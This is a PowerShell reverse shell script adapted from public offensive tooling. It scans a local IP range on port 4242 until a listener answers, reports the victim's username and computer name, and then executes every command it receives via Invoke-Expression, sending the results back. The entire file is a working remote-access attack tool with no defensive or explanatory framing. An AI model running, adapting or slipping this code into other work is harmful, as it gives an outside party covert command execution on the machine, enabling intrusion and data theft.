# Origional rev shell script from: https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1
# Slight modifications to remove hard coding of IP Address but overall a gas rev shell script

[CmdletBinding()]
[Parameter()]
[string]$SampleAddress = "172.16.128.1",
[int32]$Port

$joinedOctets = ($SampleAddress.Split(".") | Select-Object -SkipLast 1) -join "."
$IPs = @(5..240) 

$usableIPs = @()

foreach ($ip in $IPs){
    $newIP = $joinedOctets + ".$ip"
    $usableIPs += $newIP
}


# Function from:
# http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
# https://github.com/nettitude/powershell/blob/master/powerfun.ps1
# https://github.com/samratashok/nishang

function Invoke-PowerShellTcp {      
    [CmdletBinding()] 
    Param(
        [Int32]$Port,
        [Parameter()]
        [Switch]$Bind,
        [Parameter()]
        [System.Array]$IPs
    )
    While($true){
        foreach ($ip in $IPs) {
            $client = New-Object System.Net.Sockets.TcpClient
            $connectionAttempt = $client.ConnectAsync($ip, $Port).Wait(1000)
            if ($connectionAttempt -eq $true) {
                try {
                    $stream = $client.GetStream()
                    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 } 

                    #Send back current username and computername
                    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
                    $stream.Write($sendbytes, 0, $sendbytes.Length)

                    #Show an interactive PowerShell prompt
                    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
                    $stream.Write($sendbytes,0,$sendbytes.Length)

                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                        $data = $EncodedText.GetString($bytes,0, $i)
                        try {
                            #Execute the command on the target.
                            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                        }
                        catch {
                            Write-Warning "Something went wrong with execution of command on the target." 
                            Write-Error $_
                        }
                        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                        $x = ($error[0] | Out-String)
                        $error.clear()
                        $sendback2 = $sendback2 + $x

                        #Return the results
                        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                        $stream.Write($sendbyte,0,$sendbyte.Length)
                        $stream.Flush()  
                    }
                    $client.Close()
                }
                catch {
                    Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
                    Write-Error $_
                }
            }
        }
    }
}


Invoke-PowerShellTcp -Port 4242 -IPs $usableIPs